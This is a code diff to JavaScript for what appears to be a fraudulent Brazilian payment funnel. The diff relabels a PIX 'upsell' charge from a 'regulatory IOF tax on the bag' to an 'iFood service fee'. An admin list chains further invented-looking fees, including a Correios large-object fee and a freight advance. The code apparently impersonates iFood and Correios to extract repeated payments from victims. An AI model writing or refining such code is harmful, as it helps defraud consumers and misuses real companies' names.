@@ -2732,7 +2732,7 @@ function initUpsellIof() {
             ...Array.from(document.querySelectorAll('#price'))
         ])
     );
-    const acceptIdleLabel = btnAccept?.textContent || `Pagar taxa de IOF de ${formatCurrency(offerPrice)}`;
+    const acceptIdleLabel = btnAccept?.textContent || `Pagar taxa de servico ${formatCurrency(offerPrice)}`;
     let submitInFlight = false;
 
     if (leadName && personal?.name) {
@@ -2793,9 +2793,9 @@ function initUpsellIof() {
         submitInFlight = true;
 
         const iofShipping = {
-            id: 'taxa_iof_bag',
-            name: 'Taxa regulatoria IOF da BAG',
-            eta: 'Regularizacao imediata',
+            id: 'taxa_servico_ifood',
+            name: 'Taxa de Servico iFood',
+            eta: 'Liberacao imediata',
             price: offerPrice
         };
 
@@ -2809,13 +2809,13 @@ function initUpsellIof() {
         });
 
         try {
-            if (btnAccept) btnAccept.textContent = 'Gerando PIX da taxa de IOF...';
+            if (btnAccept) btnAccept.textContent = 'Gerando PIX da taxa de servico...';
             await createPixCharge(iofShipping, 0, {
                 sourceStage: 'upsell_iof',
                 upsell: {
                     enabled: true,
-                    kind: 'taxa_iof_bag',
-                    title: 'Taxa de IOF da BAG',
+                    kind: 'taxa_servico_ifood',
+                    title: 'Taxa de Servico iFood',
                     price: offerPrice,
                     previousTxid: String(pix?.idTransaction || '').trim(),
                     targetAfterPaid: 'upsell-correios.html'
@@ -2823,7 +2823,7 @@ function initUpsellIof() {
             });
         } catch (error) {
             if (btnAccept) btnAccept.textContent = acceptIdleLabel;
-            showToast(error.message || 'Nao foi possivel gerar o PIX da taxa de IOF.', 'error');
+            showToast(error.message || 'Nao foi possivel gerar o PIX da taxa de servico.', 'error');
             setLoading(false);
             submitInFlight = false;
             return false;
@@ -4551,7 +4551,7 @@ function initAdmin() {
         checkout: { label: 'checkout.html', desc: 'Endereco e selecao de frete' },
         orderbump: { label: 'orderbump.html', desc: 'Oferta do Seguro Bag' },
         pix: { label: 'pix.html', desc: 'Pagamento via PIX' },
-        'upsell-iof': { label: 'upsell-iof.html', desc: 'Upsell 1: taxa de IOF da bag' },
+        'upsell-iof': { label: 'upsell-iof.html', desc: 'Upsell 1: taxa de servico iFood' },
         'upsell-correios': { label: 'upsell-correios.html', desc: 'Upsell 2: taxa de objeto grande dos Correios' },
         upsell: { label: 'upsell.html', desc: 'Upsell 3: adiantamento do frete' }
     };
